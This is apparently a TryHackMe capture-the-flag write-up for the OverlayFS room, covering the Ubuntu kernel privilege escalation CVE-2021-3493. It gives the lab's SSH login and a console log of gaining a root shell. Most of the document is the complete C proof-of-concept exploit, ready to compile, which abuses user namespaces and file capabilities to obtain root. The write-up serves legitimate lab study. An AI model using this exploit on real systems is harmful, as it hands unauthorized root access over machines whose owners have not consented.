---
title: Overlayfs TryHackMe Machine Writeup and Walkthrough
author: Gaurav Raj
date: 2021-05-14 10:47:00 +0800
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, thm, writeup, walkthrough, overlayfs, ubuntu, thehackersbrain, CVE-2021-3493]
---

## OverLayFS
> TryHackMe Room for demonstrating and exploiting the recent ubuntu kernel exploit for Quick PrivEsc

## Introducation
OverlayFS is a Linux kernel module that allows the system to combine several mount points into one, so that you can access all the files from each within one directory structure.

It's often used by live USBs, or some other specialist applications. One use is having a read only root file system, and another partition "overlayed" with that to allow applications to write to a temporary file system.

More resources are included in the final task (Further reading) if you'd like to learn more about OverlayFS and this exploit.

## CVE-2021-3493 - OverlayFS Exploit 
### About the vuln

Recently, SSD-Disclosure released a proof of concept (and a great explanation) for an Ubuntu kernel exploit ([https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/)).  

This vulnerability is particularly serious, as overlayfs is a kernel module that is installed by default on Ubuntu 1804 Server.  
If the system is vulnerable, you can very easily escalate from any user to root, as long as you can run a binary.  
If there isn't a C compiler installed on the machine, you can compile the binary statically elsewhere and copy just the binary over.

### Credentials for SSH

`Username: overlay`

`Password: tryhackme123`

### Flag
```
thm{xxxxxxxxxxxxxxxxxxxxxx}
```

## Console Log
```
overlay@overlayfs:~$ vi exploit.c
overlay@overlayfs:~$ gcc exploit.c -o exploit
overlay@overlayfs:~$ ./exploit 
bash-4.4# cat /root/root.txt
cat: /root/root.txt: No such file or directory
bash-4.4# ls
exploit  exploit.c  ovlcap
bash-4.4# cd
bash-4.4# ls
exploit  exploit.c  ovlcap
bash-4.4# cd /
bash-4.4# ls
bin   home	      lib64	  opt	sbin	  tmp	   vmlinuz.old
boot  initrd.img      lost+found  proc	srv	  usr
dev   initrd.img.old  media	  root	swapfile  var
etc   lib	      mnt	  run	sys	  vmlinuz
bash-4.4# cd /root
bash-4.4# ls
flag.txt
bash-4.4# cat flag.txt 
thm{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
bash-4.4# 
```

## Exploit
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>

//#include <attr/xattr.h>
//#include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }

        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");

    xwritefile("/proc/self/setgroups", "deny");

    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);

    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);

    // all+ep
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";

    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
        err(1, "setxattr %s", BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}
```

## Further Reading
### Want to know more about OverlayFS?

[https://yagrebu.net/unix/rpi-overlay.md](https://yagrebu.net/unix/rpi-overlay.md) - Read only root file system with overlayfs to allow applications to run normally.

[https://wiki.archlinux.org/index.php/Overlay\_filesystem](https://wiki.archlinux.org/index.php/Overlay_filesystem) - The Arch Wiki's page on OverlayFS (I use Arch BTW)

### Want to know more about this specific CVE?

[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3493](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3493) - Mitre's CVE entry for this vulnerability, which includes many further links.

[https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/)[](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/) - This is where we got the PoC code, and it explains the vulnerability very well.  

---